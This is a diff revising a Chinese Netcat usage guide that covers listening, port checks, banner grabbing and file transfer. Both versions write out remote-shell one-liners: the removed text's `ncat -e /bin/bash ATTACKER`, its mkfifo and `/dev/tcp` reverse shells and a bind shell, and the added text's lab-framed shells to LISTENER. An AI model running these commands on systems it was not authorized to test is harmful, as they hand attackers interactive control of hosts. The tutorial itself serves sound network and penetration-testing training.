@@ -1,207 +1,215 @@
-# Netcat
+# Netcat (nc) 使用指南
 
-Netcat（nc）被称为"网络安全界的瑞士军刀"，用于建立原始 TCP/UDP 连接：读写数据、监听端口、抓取横幅、传文件、起 Shell。没有协议限制，curl 只能发 HTTP，nc 什么都能发。
+`nc` 用于建立 TCP/UDP 连接、监听端口、测试服务和传输数据。它不会理解 HTTP、FTP 等协议，输入什么就发送什么，因此很适合做快速连通性检查和简单协议交互。
 
-## 一、实现差异（先看这个）
+以下命令默认在 Linux/macOS 终端执行，`TARGET` 表示目标 IP 或域名，`PORT` 表示端口。
 
-不同发行版带的 nc 功能差别很大，**最大的坑是 `-e`（连接后执行命令）并非所有版本都有**：
+## 1. 先确认版本
 
-| 实现             | 常见位置                                     | 有 `-e` | 有 `-z`（扫描） | 有 `-k`（保持监听）     | 说明                          |
-| -------------- | ---------------------------------------- | ------ | ---------- | ---------------- | --------------------------- |
-| netcat-openbsd | Debian/Ubuntu 的 `nc`                     | 无      | 有          | 有                | 默认 `nc`，安全考量移除了 `-e`        |
-| ncat（Nmap）     | Kali 的 `nc`/`ncat`                       | 有      | 无          | 有（`--keep-open`） | 功能最全，支持 `--ssl`、`--sh-exec` |
-| 传统 netcat      | `netcat-traditional` 包的 `nc.traditional` | 有      | 有          | 无                | 老古董，用 `-p` 指定端口             |
-
-> 判断方法：`nc -h` 帮助里有 `-e` 就是支持执行命令的版本。反弹 Shell 前先确认目标机上的 nc 类型，否则 `-e` 会直接报 "invalid option"。
-
-## 二、基本语法
+不同实现的参数不完全相同。先查看帮助信息：
 
 ```bash
-nc [选项] <目标主机> <端口>   # 连接模式
-nc -l [选项] <端口>           # 监听模式（等待别人连进来）
+nc -h
+ncat --help
+command -v nc ncat
 ```
 
-> 监听时端口直接作为位置参数（netcat-openbsd 写法）；`nc -lvnp 4444` 这种带 `-p` 的写法在 ncat 和兼容模式下仍可用。传统版必须用 `-p` 指定端口。
+常见区别：
 
-## 三、常用选项速查
+- `netcat-openbsd`：Debian、Ubuntu 常见，通常不支持 `-e`，监听端口直接写在最后。
+- `ncat`：随 Nmap 提供，支持 `-e`、`--exec` 等参数，监听端口可直接写在最后。
+- `netcat-traditional`：支持 `-e`，老版本命令通常使用 `-p PORT` 指定监听端口。
 
-| 选项          | 说明                              |
-| ----------- | ------------------------------- |
-| `-l`        | 监听模式，等待入站连接                     |
-| `-v`        | 详细输出（连接成功、收到 banner 时会显示）       |
-| `-n`        | 不做 DNS 解析（只认 IP，加快速度）           |
-| `-z`        | 零 I/O 扫描模式，只测端口通不通（openbsd/传统版） |
-| `-w <SEC>`  | 连接/空闲超时秒数（扫描必用，防止挂住）            |
-| `-q <SEC>`  | 收到 EOF 后等待 N 秒再退出；`-q 0` 立即退出   |
-| `-k`        | 监听端断开后不退出，继续等待新连接（openbsd/ncat） |
-| `-N`        | 收到 EOF 后关闭 socket（openbsd）      |
-| `-u`        | UDP 模式                          |
-| `-i <SEC>`  | 发送/接收行之间的间隔秒数                   |
-| `-e <CMD>`  | 连接建立后执行命令（仅 ncat/传统版）           |
-| `-s <IP>`   | 指定源 IP（连接时）                     |
-| `-4` / `-6` | 强制 IPv4 / IPv6                  |
+如果某个参数提示 `invalid option`，先以本机帮助信息为准，不要直接照搬其他版本的命令。
 
-> 注意：openbsd 版的 `-S` 是 TCP MD5 签名，**不是** SSL。要做 TLS 加密连接用 ncat 的 `--ssl`。
+## 2. 常用参数
 
----
+| 参数 | 作用 |
+| --- | --- |
+| `-l` | 监听模式 |
+| `-v` | 显示连接过程和错误信息 |
+| `-n` | 不进行 DNS 解析 |
+| `-u` | 使用 UDP |
+| `-w SEC` | 设置连接或空闲超时时间 |
+| `-z` | 只检查端口，不发送数据；常见于 OpenBSD/传统版 |
+| `-k` | 监听端断开后继续等待连接 |
+| `-q SEC` | 输入结束后等待指定秒数再退出 |
+| `-N` | 输入结束后关闭连接；部分 OpenBSD 版本支持 |
+| `-e CMD` | 连接后执行命令；并非所有版本支持 |
 
-## 四、监听与连接
+## 3. TCP 连接和监听
+
+监听方：
 
 ```bash
-# 监听 4444 端口（攻击机常用）
+# OpenBSD nc
 nc -lvn 4444
 
-# 连接目标
-nc TARGET 4444
+# Ncat
+ncat -lvn 4444
 
-# 两边都起来后，任何一端输入的文字都会实时传给另一端（双向通信）
+# 传统版
+nc -lvnp 4444
 ```
 
----
-
-## 五、横幅抓取与协议交互
+连接方：
 
 ```bash
-# 连上去后目标可能直接吐 banner（SMTP/FTP/SSH 版本等）
-nc -vn TARGET 80
-
-# 手工发原始 HTTP 请求
-printf "GET / HTTP/1.1\r\nHost: TARGET\r\nConnection: close\r\n\r\n" | nc -w 3 TARGET 80
-
-# 交互式：nc TARGET 8080 后手动敲入协议命令
-nc TARGET 21
-220 (vsFTPd 2.3.4)...
-USER anonymous
+nc -vn TARGET 4444
 ```
 
-> `-w 3` 很重要：很多服务不会主动关闭连接，不设超时 nc 会一直挂在那。
+连接建立后，两端输入的内容会互相传输。终止连接通常按 `Ctrl+C`。
 
----
+## 4. 检查端口是否开放
 
-## 六、反弹 Shell
-
-攻击机先监听，受害者回连：
+检查单个 TCP 端口：
 
 ```bash
-# 攻击机（本机）
-nc -lvn 4444
+nc -zvn -w 2 TARGET 22
 ```
 
-受害者端，按 nc 变体选一个：
+检查多个端口或端口范围：
 
 ```bash
-# 有 -e 的版本（ncat / 传统 nc）
-ncat -e /bin/bash ATTACKER 4444
-
-# 无 -e 的 netcat-openbsd：用 FIFO 管道模拟
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER 4444 > /tmp/f
-
-# 受害者是 Windows
-ncat -e cmd.exe ATTACKER 4444
+nc -zvn -w 1 TARGET 22 80 443
+nc -zvn -w 1 TARGET 1-1000
 ```
 
-> 受害机上不一定有 nc。没有时可用 bash 内建 `/dev/tcp` 回连：`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`。
-
----
-
-## 七、绑定 Shell
-
-受害者监听，攻击者主动连入（适合受害者在 NAT 内、无法回连的场景）：
+检查 UDP 端口：
 
 ```bash
-# 受害者开启绑定 Shell（有 -e 的版本）
-ncat -lvnp 4444 -e /bin/bash
-
-# 攻击者连接
-nc ATTACKER 4444
+nc -zuvn -w 2 TARGET 53
 ```
 
----
+UDP 没有 TCP 那样明确的连接状态，端口没有响应不一定代表端口关闭。需要结合服务响应或其他工具确认。
 
-## 八、文件传输
+`-w` 建议始终设置，否则目标无响应时命令可能长时间等待。复杂扫描优先使用 `nmap`，`nc` 更适合临时验证。
+
+## 5. 抓取 Banner 和手工发请求
+
+连接服务并观察其主动返回的信息：
 
 ```bash
-# 接收方（攻击机）先监听
+nc -vn TARGET 21
+nc -vn TARGET 22
+```
+
+手工发送 HTTP 请求：
+
+```bash
+printf 'GET / HTTP/1.1\r\nHost: TARGET\r\nConnection: close\r\n\r\n' | nc -w 3 TARGET 80
+```
+
+也可以进入交互模式，手动输入协议内容：
+
+```bash
+nc TARGET 25
+```
+
+如果服务不会主动断开连接，使用 `-w 3` 等超时参数，避免命令一直等待。
+
+## 6. 简单传输文件
+
+接收方先监听并写入文件：
+
+```bash
 nc -lvn 4444 > received.txt
-
-# 发送方（目标机）把文件推过来
-nc ATTACKER 4444 < file.txt
 ```
 
-> 坑：发送方 stdin 到 EOF 后，openbsd 版 nc 不会立刻关连接，接收方会挂住收尾。发送端加 `-q 0`（或 openbsd 版加 `-N`）保证发完即关：
+发送方连接并读取文件：
 
 ```bash
-cat file.txt | nc -q 0 ATTACKER 4444
+nc -N RECEIVER 4444 < file.txt
 ```
 
----
-
-## 九、端口扫描
+如果当前版本不支持 `-N`，可以使用：
 
 ```bash
-# 批量测端口连通性（-z 不发送数据）
-nc -zv -w 1 TARGET 22 80 443
-nc -zv -w 1 TARGET 1-1000
-
-# UDP 端口测试
-nc -uzv -w 1 TARGET 53 161
+nc -q 0 RECEIVER 4444 < file.txt
 ```
 
-> `-z` 在 ncat 里不存在（Kali 的 `nc` 就是 ncat）。且 nc 扫描无 SYN 半开等隐蔽特性、速度也不如 nmap，只在目标机上没有 nmap 时才用它临时顶一下。
+传输前后检查文件大小或哈希值。`nc` 本身不提供加密、身份认证和断点续传，不适合直接传输敏感文件或大文件。
 
----
+## 7. UDP 收发数据
 
-## 十、UDP 通信
+接收方：
 
 ```bash
-# UDP 客户端
-nc -u TARGET 53
-
-# UDP 监听
-nc -luvn 4444
+nc -ulvn 4444
 ```
 
-> UDP 无连接状态，通不通要看对方有没有回包，超时判断主要靠 `-w`。
-
----
-
-## 十一、端口转发 / 代理（ncat）
+发送方：
 
 ```bash
-# 把本地 8080 转发到内网 TARGET:80（跳板机思路）
-ncat -lvn 8080 --sh-exec "ncat TARGET 80"
-
-# 以 root 权限转发到低端口（Linux <1024 需要权限）
-ncat -lvn 80 --sh-exec "ncat TARGET 8080"
+printf 'hello\n' | nc -uvn -w 2 RECEIVER 4444
 ```
 
----
+UDP 监听方通常不会像 TCP 一样显示连接建立信息，只会在收到数据后输出内容。
 
-## 十二、ncat 高级功能
+## 8. 授权实验中的 Shell 连接
+
+下面的内容仅用于自己控制的主机、靶场或明确授权的测试环境。先确认目标上的 `nc` 实现支持 `-e`，并确认监听端口已被防火墙允许。
+
+监听方：
 
 ```bash
-# TLS 加密通信
-ncat --ssl TARGET 443
-ncat -lvn 4444 --ssl --ssl-cert server.pem --ssl-key server.key
-
-# 保持监听，接受多次连接（-k）
-ncat -lvn 4444 -k
-
-# 中转 / 聊天服务器（多客户端广播）
-ncat --broker --listen 4444
-
-# 只收不送 / 只送不收（文件传输收尾更稳）
-ncat -lvn 4444 --recv-only > file.txt
+nc -lvn 4444
 ```
 
----
+目标端使用支持 `-e` 的 Ncat 或传统版：
 
-## 记忆要点
+```bash
+ncat -e /bin/bash LISTENER 4444
+```
 
-- **先分清 nc 变体**：`-e` 只有 ncat/传统版有；openbsd 版用 FIFO 管道替代；Kali 的 `nc` 其实是 ncat
-- **扫描用 `-z -w 1`**，不设超时端口挂了会卡住
-- **协议交互要加 `-w 3`**，服务不关连接时 nc 会一直挂着
-- **文件传输发送端加 `-q 0`**，否则 EOF 后连接不收，接收端无法收尾
-- **监听端口写法**：openbsd 用位置参数 `nc -lvn 4444`，传统版必须 `-p 4444`，`-lvnp` 写法全兼容
-- **TLS 用 ncat `--ssl`**，别把 openbsd 的 `-S`（TCP MD5 签名）当成 SSL
-- 反弹 Shell 首选 `-e`，无 `-e` 时 mkfifo 管道是通用替代；都没有就用 bash `/dev/tcp`
+如果是 Windows 目标：
+
+```powershell
+ncat.exe -e cmd.exe LISTENER 4444
+```
+
+OpenBSD 版没有 `-e` 时，可在授权 Linux 实验环境中使用 FIFO：
+
+```bash
+rm -f /tmp/ncpipe
+mkfifo /tmp/ncpipe
+cat /tmp/ncpipe | /bin/sh -i 2>&1 | nc LISTENER 4444 > /tmp/ncpipe
+```
+
+测试结束后关闭监听，并删除实验过程中创建的临时文件。
+
+## 9. 常见问题
+
+### `-e` 参数不可用
+
+这是实现差异，不是命令写错。改用 `ncat`，或使用上面的 FIFO 方式。
+
+### 监听命令报参数错误
+
+OpenBSD 版通常使用：
+
+```bash
+nc -lvn 4444
+```
+
+传统版常见写法是：
+
+```bash
+nc -lvnp 4444
+```
+
+### 文件传输后接收方不退出
+
+发送方输入结束后没有关闭连接。尝试 `-N` 或 `-q 0`，并确认发送内容来自文件重定向，而不是仍在等待标准输入。
+
+### 能监听但无法连接
+
+依次检查监听地址、IP 和端口是否正确，以及本机和目标之间的防火墙、安全组、NAT 和路由规则。监听在 `127.0.0.1` 时只能接受本机连接；需要接受其他主机连接时，监听地址应绑定到对应网卡或所有地址。
+
+## 快速记忆
+
+- 连服务：`nc -vn TARGET PORT`
+- 监听 TCP：`nc -lvn PORT`
+- 测试端口：`nc -zvn -w 2 TARGET PORT`
+- 传文件：接收方重定向到文件，发送方用 `< file`，结束时加 `-N` 或 `-q 0`
+- 参数报错：先确认是 OpenBSD、Ncat 还是传统版
